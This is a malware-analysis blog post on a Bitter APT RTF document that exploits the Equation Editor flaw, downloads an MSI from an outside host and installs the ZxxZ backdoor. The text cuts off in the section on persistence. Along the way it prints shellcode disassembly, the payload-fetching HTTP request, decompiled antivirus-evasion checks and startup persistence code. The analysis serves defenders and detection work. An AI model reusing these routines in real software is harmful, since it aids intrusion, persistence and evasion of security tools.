<!doctype html><html lang=en dir=ltr><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee | Malware Hell</title><meta name=generator content="Hugo Eureka 0.9.3"><link rel=stylesheet href=https://c3rb3ru5d3d53c.github.io/css/eureka.min.9cec6350e37e534b0338fa9a085bf06855de3b0f2dcf857e792e5e97b07ea905d4d5513db554cbc26a9c3da622bae92d.css><script defer src=https://c3rb3ru5d3d53c.github.io/js/eureka.min.fa9a6bf6d7a50bb635b4cca7d2ba5cf3dfb095ae3798773f1328f7950028b48c17d06276594e1b5f244a25a6c969a705.js></script>
<link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload href="https://fonts.googleapis.com/css2?family=Lora:wght@400;600;700&family=Noto+Serif+SC:wght@400;600;700&display=swap" as=style onload='this.onload=null,this.rel="stylesheet"'><link rel=stylesheet href=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/styles/base16/solarized-light.min.css media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/highlight.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/dart.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/bash.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/cpp.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/python.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/c.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/vbscript.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/powershell.min.js crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.4.0/build/languages/http.min.js crossorigin></script>
<link rel=stylesheet href=https://c3rb3ru5d3d53c.github.io/css/highlightjs.min.2958991528e43eb6fc9b8c4f2b8e052f79c4010718e1d1e888a777620e9ee63021c2c57ec7417a3108019bb8c41943e6.css media=print onload='this.media="all",this.onload=null'><script defer type=text/javascript src=https://c3rb3ru5d3d53c.github.io/js/fontawesome.min.9956a9fdeeb895bcca3e646ea4f943c9dfbabb5b76757ae1c2c3b3fe2ee29f21edf15c30e1b524d558b6363569a57b12.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css integrity=sha384-MlJdn/WNKDGXveldHDdyRP1R4CTHr3FeuDNfhsLPYrq2t0UBkUdK2jyTnXPEK1NQ media=print onload='this.media="all",this.onload=null' crossorigin><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js integrity=sha384-VQ8d8WVFw0yHhCk5E8I86oOhv48xLpnDZx5T9GogA/Y84DcCKWXDmSDfn13bzFZY crossorigin></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script defer src=https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js integrity=sha384-atOyb0FxAgN9LyAc6PEf9BjgwLISyansgdH8/VXQH8p2o5vfrRgmGIJ2Sg22L0A0 crossorigin></script>
<link rel=icon type=image/png sizes=32x32 href=https://c3rb3ru5d3d53c.github.io/images/profile_hudffae30dddd93a90cdf89d35bb97314e_107726_32x32_fill_q75_box_center.jpg><link rel=apple-touch-icon sizes=180x180 href=https://c3rb3ru5d3d53c.github.io/images/profile_hudffae30dddd93a90cdf89d35bb97314e_107726_180x180_fill_q75_box_center.jpg><meta name=description content="An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Malware Blog","item":"https://c3rb3ru5d3d53c.github.io/malware-blog/"},{"@type":"ListItem","position":2,"name":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee","item":"https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/"},"headline":"Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee | Malware Hell","datePublished":"2022-06-26T00:00:00+00:00","dateModified":"2022-06-26T00:00:00+00:00","wordCount":4585,"author":{"@type":"Person","name":"c3rb3ru5d3d53c"},"publisher":{"@type":"Person","name":"c3rb3ru5d3d53c","logo":{"@type":"ImageObject","url":"https://c3rb3ru5d3d53c.github.io/images/profile.jpg"}},"description":"An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."}</script><meta property="og:title" content="Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee | Malware Hell"><meta property="og:type" content="article"><meta property="og:image" content="https://c3rb3ru5d3d53c.github.io/images/profile.jpg"><meta property="og:url" content="https://c3rb3ru5d3d53c.github.io/malware-blog/2022-07-04-bitter-apt-zxxz-backdoor/"><meta property="og:description" content="An analysis of a Bitter APT maldoc exploit, ZxxZ backdoor and controling it with our own C2 server."><meta property="og:locale" content="en"><meta property="og:site_name" content="Malware Hell"><meta property="article:published_time" content="2022-06-26T00:00:00+00:00"><meta property="article:modified_time" content="2022-06-26T00:00:00+00:00"><meta property="article:section" content="malware-blog"><meta property="article:tag" content="bitter"><meta property="article:tag" content="hazytiger"><meta property="article:tag" content="t-apt-17"><meta property="article:tag" content="apt-c-08"><meta property="article:tag" content="asia"><meta property="article:tag" content="pakistan"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/docs/cheatsheet/"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/docs/malware-analysis-beginner-guide/"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/docs/kvm-malware-lab/"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-12-qakbot-downloader/"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-10-vjw0rm-vipersoftx-variant/"><meta property="og:see_also" content="https://c3rb3ru5d3d53c.github.io/malware-blog/2020-02-01-vjw0rm-mr-robot-variant/"><body class="flex min-h-screen flex-col"><header class="min-h-16 pl-scrollbar bg-secondary-bg fixed z-50 flex w-full items-center shadow-sm"><div class="mx-auto w-full max-w-screen-xl"><script>let storageColorScheme=localStorage.getItem("lightDarkMode");((storageColorScheme=="Auto"||storageColorScheme==null)&&window.matchMedia("(prefers-color-scheme: dark)").matches||storageColorScheme=="Dark")&&document.getElementsByTagName("html")[0].classList.add("dark")</script><nav class="flex items-center justify-between flex-wrap px-4 py-4 md:py-0"><a href=/ class="me-6 text-primary-text text-xl font-bold">Malware Hell</a>
<button id=navbar-btn class="md:hidden flex items-center px-3 py-2" aria-label="Open Navbar">
<i class="fas fa-bars"></i></button><div id=target class="hidden block md:flex md:grow md:justify-between md:items-center w-full md:w-auto text-primary-text z-20"><div class="md:flex md:h-16 text-sm md:grow pb-4 md:pb-0 border-b md:border-b-0"><a href=/malware-blog/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 selected-menu-item me-4">Malware Blog</a>
<a href=/personal-blog/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">Personal Blog</a>
<a href=/iocs/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">IOCs</a>
<a href=https://github.com/c3rb3ru5d3d53c/signatures/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">Signatures</a>
<a href=/docs/ class="block mt-4 md:inline-block md:mt-0 md:h-(16-4px) md:leading-(16-4px) box-border md:border-t-2 md:border-b-2 border-transparent me-4">Documents</a></div><div class=flex><div class="relative pt-4 md:pt-0"><div class="cursor-pointer hover:text-eureka" id=lightDarkMode><i class="fas fa-adjust"></i></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-30" id=is-open></div><div class="absolute flex flex-col start-0 md:start-auto end-auto md:end-0 hidden bg-secondary-bg w-48 rounded py-2 border border-tertiary-bg cursor-pointer z-40" id=lightDarkOptions><span class="px-4 py-1 hover:text-eureka" name=Light>Light</span>
<span class="px-4 py-1 hover:text-eureka" name=Dark>Dark</span>
<span class="px-4 py-1 hover:text-eureka" name=Auto>Auto</span></div></div></div></div><div class="fixed hidden inset-0 opacity-0 h-full w-full cursor-default z-0" id=is-open-mobile></div></nav><script>let element=document.getElementById("lightDarkMode");storageColorScheme==null||storageColorScheme=="Auto"?document.addEventListener("DOMContentLoaded",()=>{window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",switchDarkMode)}):storageColorScheme=="Light"?(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","sun"),element.firstElementChild.classList.add("fa-sun")):storageColorScheme=="Dark"&&(element.firstElementChild.classList.remove("fa-adjust"),element.firstElementChild.setAttribute("data-icon","moon"),element.firstElementChild.classList.add("fa-moon")),document.addEventListener("DOMContentLoaded",()=>{getcolorscheme(),switchBurger()})</script></div></header><main class="grow pt-16"><div class=pl-scrollbar><div class="mx-auto w-full max-w-screen-xl lg:px-4 xl:px-8"><div class="grid grid-cols-2 gap-4 lg:grid-cols-8 lg:pt-12"><div class="bg-secondary-bg col-span-2 rounded px-6 py-8 lg:col-span-6"><article class=prose><h1 class=mb-4>Making Fun of Your APT Malware - Bitter APT Using ZxxZ Backdoor to Target Pakistan Public Accounts Committee</h1><div class="text-tertiary-text not-prose mt-2 flex flex-row flex-wrap items-center"><div class="me-6 my-2"><i class="fas fa-calendar me-1"></i>
<span>2022-06-26</span></div><div class="me-6 my-2"><i class="fas fa-clock me-1"></i>
<span>22 min read</span></div><div class="me-6 my-2"><i class="fas fa-folder me-1"></i>
<a href=https://c3rb3ru5d3d53c.github.io/categories/malware/ class=hover:text-eureka>malware</a></div></div><h2 id=introduction>Introduction</h2><p><a href=https://malpedia.caad.fkie.fraunhofer.de/actor/hazy_tiger>Bitter APT</a> (T-APT-17/APT-C-08/Orange Yali) is a group known to operate in South Asia and is suspected to be an Indian üáÆ‚Äçüá≥ APT. They primarialy target Pakistan üáµ‚Äçüá∞, Saudi Arabia üá∏‚Äçüá¶ and China.</p><h2 id=analysis>Analysis</h2><p>This will be an indepth analysis of Bitter APT&rsquo;s backdoor named ZxxZ. We will cover almost every aspect of the attack chain including, exploit shellcode analysis, building our own C2 server to communicate with the malware and writing detection signatures for the community.</p><h3 id=situational-awareness>Situational Awareness</h3><p><a href=https://twitter.com/ShadowChasing1>ShadowChasing1</a> posted on Twitter of about new activity from the group.</p><blockquote class=twitter-tweet><p lang=en dir=ltr>Today our researchers have found new sample which belongs to <a href="https://twitter.com/hashtag/Bitter?src=hash&ref_src=twsrc%5Etfw">#Bitter</a> <a href="https://twitter.com/hashtag/APT?src=hash&ref_src=twsrc%5Etfw">#APT</a> group<br>ITW:bf1a905e11f4d44de8bd2e0a6f383ed5<br>filename:PAC Advisory Committee Report.doc<br>URL:<br>hxxps://sbss.com.pk/gts/bd.msi<br>hxxp://subscribe.tomcruefrshsvc.com/VcvNbtgRrPopqSD/SzWvcxuer/userlog.php</p>&mdash; Shadow Chaser Group (@ShadowChasing1) <a href="https://twitter.com/ShadowChasing1/status/1478259210110775297?ref_src=twsrc%5Etfw">January 4, 2022</a></blockquote><script async src=https://platform.twitter.com/widgets.js></script><p>I decided to have a closer look just for fun. üòÖ</p><h3 id=infection-chain>Infection Chain</h3><p>The sample is a <a href=https://en.wikipedia.org/wiki/Rich_Text_Format>RTF</a> document purporting to be a Program Advisory Comittee (PAC) report. Based on some quick googling, <a href=https://en.wikipedia.org/wiki/Pakistan>Pakistan</a> üáµ‚Äçüá∞ does have a <a href=https://agp.gov.pk/SiteImage/Misc/files/8_ecosai-circular-spring-issue-2020-article-Faisal%20Saeed%20Cheema.pdf>Public Accounts Comittee</a>. The PAC is responsible for regulating the use of public funds. If you are of course an adversary to Pakistan üáµ‚Äçüá∞, involving yourself in such afairs gives you better insight into the financial structure of a country. I&rsquo;m not an expert in international affairs so if this is incorrect please DM me on <a href=https://twitter.com/c3rb3ru5d3d53c>Twitter</a> and I&rsquo;ll make any nessasary corrections to this analysis. The exploit shellcode will download a MSI installer, which extracts a CAB Archive containing the final Portable Executable (PE) payload.</p><div class=mermaid>graph LR
subgraph Exploitation
0(RTF Document) & 1(Shellcode)
	end
	subgraph Post Exploitation
2(MSI Installer) -->|extract| 3(CAB Archive) -->|extract| 4(Payload)
end
0 -->|CVE-2017-1182| 1
1 -->|download| 2</div><h3 id=exploitation>Exploitation</h3><p>The initial sample <em>PAC Advisory Committee Report.doc</em> (<em>sample_0.bin</em>), is an RTF document containing the Equation Editor exploit (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882">CVE-2017-1182</a>). Although this exploit is quite old now, it is still used by threat actors to this day.</p><h4 id=extracting-shellcode>Extracting Shellcode</h4><p>The exploit exists in object <em>4</em> in the RTF document and can be identified using <em>rtfdump</em>.</p><pre><code class=language-bash>rtfdump.py --objects sample_0.doc
1: Name: b'Equation.3\x00'
   Magic: b'd0cf11e0'
   Size: 3584
   Hash: md5 32a758aab375df78e25fbee9d6db9ec4
</code></pre><p>Now that we have identified the suspicious OLE object, let&rsquo;s extract it.</p><pre><code class=language-bash>rtfdump.py -s 4 -H -c &quot;0x23:0xe23&quot; -d sample_0.doc &gt; sample_1.bin
file sample_1.bin
sample_1.bin: Composite Document File V2 Document, Cannot read section info
</code></pre><p>The first order of business is to check this out with <strong>oledir</strong>.</p><pre><code class=language-bash>oledir sample_1.bin
</code></pre><p>This identifies to us that the CLSID <em>0002CE02-0000-0000-C000-000000000046</em> is being used in Root Entry and is likely related to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11882">CVE-2017-1182</a>.</p><p>Now to extract object <em>4</em> from the OLE, which contains the shellcode.</p><pre><code class=language-bash>oledump.py sample_1.bin
  1:       102 '\x01CompObj'
  2:        20 '\x01Ole'
  3:         6 '\x03ObjInfo'
  4:       741 'Equation Native'
oledump.py -s 4 -d sample_1.bin &gt; sample_2.bin
</code></pre><p>Seeing attacks like this many times now, since there is no visible URL the shellcode likely is encrypted. It never hurts to attempt a XOR bruteforce to see if you are successful or not.</p><pre><code class=language-bash>xorbruteforcer.py sample_2.bin | strings
</code></pre><p>This yields us the following strings with a <strong>0xff</strong> XOR key:</p><pre><code class=language-bash>&gt;GetPu
ddreu
CreateDirectoryA
C:\$Jz
LoadLibraryA
msi.dll
MsiSetInternalUI
MsiInstallProductA
hATSNhI=NOhITCAT
hxxp://sbss[.]com[.]pk/gts/bd[.]msi
FileA
C:\$Gts\gwsapip.exe
C:\$Gts\gw
LoadLibraryA
Shell32.dll
ShellExecuteA
C:\$Gts\gwsapip.exe
C:\Windows\explorer
open
</code></pre><p>This is a common mistake amongst threat actors from crimeware groups to APTs. We attack low skill encryption like this with pre-existing tools. Not to mention that <a href=https://github.com/VirusTotal/yara>yara</a> also has <a href="https://yara.readthedocs.io/en/stable/writingrules.html?highlight=xor#xor-strings">XOR string</a> functionality.</p><p>Using VirusTotal the URL <font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font> provides us a Body SHA256 of <a href=https://www.virustotal.com/gui/file/b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611/details>b026a255b2e17fb0c608f1265837e425ea89cc7f661975c6a0d9051e917f4611</a>, which can be found <a href=https://www.virustotal.com/gui/url/d6755d5cd5ade55a4f1ea24d8872d8be6a626f97d37b090903a76d1d8147a40a/details>here</a>.</p><p>Alright, we know where to find the next stage.</p><p>However, let&rsquo;s go a little deeper into analyzing the shellcode.</p><h4 id=shellcode-analysis>Shellcode Analysis</h4><p>Once the malicious RTF document is opened and the user clicks <em>Enable Editing</em>, the <em>eqnedt32.exe</em> process will be created. The buffer is overwritten and the shellcode will then be executed.</p><p>In the OLE object we find the bytes <em>b2 13 40 00</em>, which stand out as an interesting pointer to <em>0x004013b2</em> as usually the address space for <em>eqnedt32.exe</em> will be in this range. This is easily possible because the DLL Characteristics of <em>eqnedt32.exe</em> is not compiled with ASLR or <em>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</em> enabled. Making the exploit more reliable.</p><pre><code class=language-text>00000900  1c 00 00 00 02 00 22 c2  cc 0e 00 00 00 00 00 00  |......&quot;.........|
00000910  00 00 00 00 cc 6f 62 00  00 00 00 00 03 01 01 03  |.....ob.........|
00000920  0a 0a 01 04 ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000930  ff ff ff ff ff ff ff ff  ff ff d2 ce 44 00 e0 a3  |............D...|
00000940  45 00 2a d0 00 ff 00 00  00 00 01 03 0e 00 00 01  |E.*.............|
00000950  03 0d 00 00 01 12 83 b8  c0 44 00 e0 a3 45 00 d2  |.........D...E..|
00000960  ce 44 00 00 40 46 00 6c  3f 44 00 b2 13 40 00 49  |.D..@F.l?D...@.I|
</code></pre><p>After setting a breakpoint in the debugger on the aforementioned address, we hit a few <em>return</em> instructions and then this decryption routine.</p><pre><code class=language-asm>00464242 | B8 18404600              | mov eax,eqnedt32.464018                 |
00464247 | B9 2A020000              | mov ecx,22A                             |
0046424C | F610                     | not byte ptr ds:[eax]                   |
0046424E | 40                       | inc eax                                 |
0046424F | E2 FB                    | loop eqnedt32.46424C                    |
00464251 | 68 18404600              | push eqnedt32.464018                    |
00464256 | C3                       | ret                                     |
</code></pre><p>What we thought before was an <em>XOR</em> operation is actually in this case is a <a href=https://www.felixcloutier.com/x86/not>not</a> operation.</p><blockquote><p>NOT - Performs a bitwise NOT operation (each 1 is set to 0, and each 0 is set to 1) on the destination operand and stores the result in the destination operand location. The destination operand can be a register or a memory location.</p></blockquote><p>Thusly, performing <em>xor al, 0xff</em> then moving <em>al</em> to a memory location is equivelent to <em>not byte [&lt;ptr>]</em>.</p><p>It would appear the threat actors did not consider this weakness in their shellcode decryption algorithm.</p><p><img src=/images/0.jpg alt=xor_not_meme></p><p>The shellcode that starts being decrypted starts with a 3-byte <em>nop</em> sled and has a size of <em>0x22a</em> bytes, as indicated by moving <em>0x22a</em> into the <em>ecx</em> register when executing the <em>loop</em> instruction. Once it has finished decrypting the shellcode, the <em>return</em> instruction will set the instruction pointer to the beginning of the 3-byte nop sled.</p><p>After using the <a href=https://en.wikipedia.org/wiki/Win32_Thread_Information_Block>TIB</a> to obtain the linear address of the <a href=https://en.wikipedia.org/wiki/Process_Environment_Block>PEB</a> and getting the address of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress>kernel32.GetProcAddress</a></em>. It will get the address of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createdirectorya>kernel32.CreateDirectoryA</a></em> to create the directory <em>C:\$Jz</em>.</p><p>Once the directory has been created, it will get the addresses of <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya>kernel32.LoadLibrary</a></em> and use it to load <em>msi.dll</em> into the <em>eqnedt32.exe</em> process. It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msisetinternalui>msi.MsiSetInternalUI</a></em>. This will setup the installer&rsquo;s internal user interface. This is required for other subsequent calls to other installer functions.</p><p>After the function interface has been setup, it will call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta>msi.MsiInstallProductA</a></em> with the following parameters.</p><table><thead><tr><th>Parameter</th><th>Value</th></tr></thead><tbody><tr><td>szPackagePath</td><td><font style=color:red>hxxp://sbss[.]com[.]pk/gts/bd[.]msi</font></td></tr><tr><td>szCommandLine</td><td>ITCAI=NOATSNLL</td></tr></tbody></table><p><img src=/images/0.png alt=MsiInstallProductA>
<em>Figure 1: Equation Editor Shellcode Executing <a href=https://docs.microsoft.com/en-us/windows/win32/api/msi/nf-msi-msiinstallproducta>msi.MsiInstallProductA</a></em></p><p>This will result in the following traffic.</p><pre><code class=language-http>GET /gts/bd.msi HTTP/1.1
Connection: Keep-Alive
Accept: */*
User-Agent: Windows Installer
Host: sbss.com.pk
</code></pre><p>This will execute the MSI installer silently on using the <em>eqnedt32.exe</em> process.</p><p>The site <font style=color:red>sbss[.]com[.]pk</font> appears to be a service that allows you to buy and sell property. It was created on Feb 15th, 2021 according to <a href=https://pk6.pknic.net.pk/pk5/lookup.PK>PKNIC</a>. Interestingly, the site is using Wordpress 5.8.3 at the time of this analysis. The previous version 5.8.2 had a major SQL Injection vulnerability <a href=https://github.com/TAPESH-TEAM/CVE-2022-21661-WordPress-Core-5.8.2-WP_Query-SQL-Injection>CVE-2022-21661</a>. It is not easily posible to determine what exactly happened to the website without access. It was either compromised or it was created by the threat actors themselves. This analysis will not go into the geopolitical aspects of tracing actors. We will save this for for another blog post.</p><p>Once completed, it will call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess>kernel32.ExitProcess</a></em> as to not arouse any suspicion from the user.</p><p>Although, it may arouse some suspicion as the document is empty and does not contain any decoy text. ü§î</p><p><img src=/images/1.png alt="Failed Decoy">
<em>Figure 2: User Perspective of Suspicious Empty Document</em></p><h3 id=post-exploitation>Post Exploitation</h3><p>This section in the analysis will cover the post exploitation behavior of Bitter APT&rsquo;s ZxxZ backdoor.</p><h4 id=msi-installer>MSI Installer</h4><p>The MSI installer contains the file <em>sample_5.bin</em>, which is a <a href=https://en.wikipedia.org/wiki/Cabinet_(file_format)>Cabinet</a> (or CAB) archive file for Windows. Once extracted, we get <em>sample_6.bin</em>, which is a Windows Portable Executable (PE). This can all be extracted using <a href=https://www.7-zip.org/>7zip</a> and make it easy enough for us to gain access to the payload.</p><h4 id=payload-triage>Payload Triage</h4><p>We have finally arrived at the payload <em>sample_6.bin</em>.</p><p>I used <a href=https://github.com/mandiant/flare-floss>floss</a> on the executable and got the following interesting strings.</p><pre><code class=language-bash>floss sample_6.bin
subscribe[.]tomcruefrshsvc[.]com
update.exe
Updates
uer/sDeRcEwwQaAsSN.php?txt=
userlog.php?id=
WqeC812CCvU/
systemlog
systemlog
tmp.exe
</code></pre><p>This might be the C2 server and some of it&rsquo;s URI paths and parameters.</p><p>Opening <em>sample_6.bin</em> in <a href=https://github.com/hasherezade/pe-bear-releases>PEBear</a>, shows us that <em>ws2_32.dll</em> is present in the imports. This may give us easier insight to where the C2 communication is happening.</p><p>We can now hypothesize that this is the payload we are looking for.</p><h4 id=initialization>Initialization</h4><p>Once executed, it will use <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-loadstringa>user32.LoadStringA</a></em> to use strings from the resource string table. These strings indicate the project name is <em>NewProject</em>. These kind of artifacts are typically left behind when an application template code in Visual Studio was never provided a name and is certainly a heuristic indicator we can hunt for.</p><pre><code class=language-cpp>LoadStringA(hInstance0,&quot;NewProject_2.1&quot;,&amp;lpWindowName,100);
LoadStringA(hInstance0,&quot;NEWPROJECTT_21&quot;,&amp;lpClassName,100);
RegisterWindowClass(hInstance0);
HINSTANCE_SELF = hInstance;
hWnd = CreateWindowExA(
	NULL, &amp;lpClassName,
	&amp;lpWindowName, WS_TILEDWINDOW,
	0x80000000, 0,
	0x80000000, 0,
	(HWND)NULL, (HMENU)NULL,
	hInstance0, (LPVOID)NULL);
</code></pre><p>Interestingly, they opt to use large negative values for the parameters <em>X</em> and <em>nWidth</em> as <em>0x80000000</em> will be <em>int</em> resulting in <em>-2147483648</em>. I don&rsquo;t believe there is much legitimate purpose to this. Maybe they were worried their window would show on the screen. üòÇ</p><p>Once completed creating the window, it will perform a decryption routine on the C2 server domain <font style=color:red>subscribe[.]tomcruefrshsvc[.]com</font>. This is performed with the following algorithm.</p><p><img src=/images/4.png alt=algo>
<em>Figure 3: String Decryption Algorithm (Simple XOR)</em></p><p>After reverse engineering this algorithm we can implement the same routine in Python.</p><pre><code class=language-python>def EncryptDecrypt(key, data):
	&quot;&quot;&quot;
	Bitter APT EncryptDecrypt Strings Function
	&quot;&quot;&quot;
    keylen = len(key)
    keypos = 0
    for i in range(0, len(data)):
        if data[i] == 0x00:
            break
        if keypos &gt;= keylen:
            keypos = 0
        data[i] = data[i] ^ int(key[keypos].encode('utf-8').hex(), base=16)
        keypos += 1
    return data.decode('utf-8')
</code></pre><p>It is also possible to easily decrypt the strings in <a href=https://gchq.github.io/CyberChef/>CyberChef</a> as well.</p><p><img src=/images/3.png alt=cyberchef>
<em>Figure 4: <a href=https://gchq.github.io/CyberChef/>CyberChef</a> String Decryption</em></p><p>At least here they are using 2-byte XOR keys. üòÇ</p><p>Then it will attempt to create the start creating a directory path string using <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl>CSIDL_LOCAL_APPDATA</a></em> (<em>C:\Users\&lt;username>\AppData\Local</em>), if this was unsuccessful it will attempt to create <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl>CSIDL_TEMPLATES</a></em> (<em>C:\Users\&lt;username>\Templates</em>) and <em><a href=https://docs.microsoft.com/en-us/windows/win32/shell/csidl>CSIDL_SENDTO</a></em> (<em>C:\Users\&lt;username>\SendTo</em>) respectively.</p><pre><code class=language-cpp>iResult = SHGetFolderPathA(NULL,CSIDL_LOCAL_APPDATA,NULL,NULL,&amp;PATH);
if ((iResult != 0) &amp;&amp; (iResult = SHGetFolderPathA(NULL,CSIDL_TEMPLATES,NULL,NULL,&amp;PATH), iResult != 0)) {
	SHGetFolderPathA(NULL,CSIDL_SENDTO,NULL,NULL,&amp;PATH);
}
</code></pre><p>Once completed, it will call <em>strcat_s</em> to append the path with string <em>\\Updates</em>. It will then call <em>_mkdir</em> to create the directory <em>C:\Users\username\&lt;path-type>\Updates</em>. Execution will continue until it appends the path with the string <em>systemlog</em>, in a very redundant way. üòÇ</p><p><img src=/images/2.png alt=systemlog>
<em>Figure 5: Obfuscated but not really string &lsquo;systemlog&rsquo;.</em></p><p><img src=/images/1.jpg alt=obfuscation_fail></p><p>It will then call <em><a href=https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleep>kernel32.Sleep</a></em> to sleep for 30 seconds. Once it has finished sleeping, it will check for the presence of the process <em>avp</em> (<a href=https://www.kaspersky.ca/>Kaspersky</a>) and <em>MsMp</em> (Microsoft Security Monitor Process) and only establish persistence if those security processes are not present on the system. At least they are making an effort here to be stealthy and infect only poorly secured machines.</p><pre><code class=language-cpp>bResult = IsProcess(&quot;avp&quot;);
if ((bResult == FALSE) &amp;&amp;
	(bResult = IsProcess(&quot;MsMp&quot;),
	bResult == FALSE)){
	Persistence();
}
</code></pre><h4 id=persistence>Persistence</h4><p>To establish persistence, it will create the LNK file <em>%UserProfile%\Start Menu\Programs\Startup\update.LNK</em>, which points to <em>%UserProfile%\AppData\Local\Updates\update.exe</em>.</p><pre><code class=language-cpp>HRESULT Persistence(void){
  /*
  Bitter APT Persistence Function
  */
  HRESULT hResult;
  char cStartupPathLNK [250];
  
  CoInitialize((LPVOID)NULL);
  Sleep(1000);
  cStartupPathLNK._0_2_ = 0;
  memset(cStartupPathLNK + 2,0,248);
  hResult = SHGetFolderPathA(
	  (HWND)NULL,
	  CSIDL_STARTUP,
	  (HANDLE)NULL,
	  NULL,
	  cStartupPathLNK);
  if (hResult == 0) {
                    /* %StartUp%\\update.lnk */
    strcat_s(cStartupPathLNK,250,&quot;\\&quot;);
    strcat_s(cStartupPathLNK,250,s_update_00406bb8);
    strcat_s(cStartupPathLNK,250,&quot;.&quot;);
    strcat_s(cStartupPathLNK,250,&quot;l&quot;);
    strcat_s(cStartupPathLNK,250,&quot;n&quot;);
    strcat_s(cStartupPathLNK,250,&quot;k&quot;);
    hResult = CreateStartupLNK(cStartupPathLNK);
  }
  CoUninitialize();
  return hResult;
}
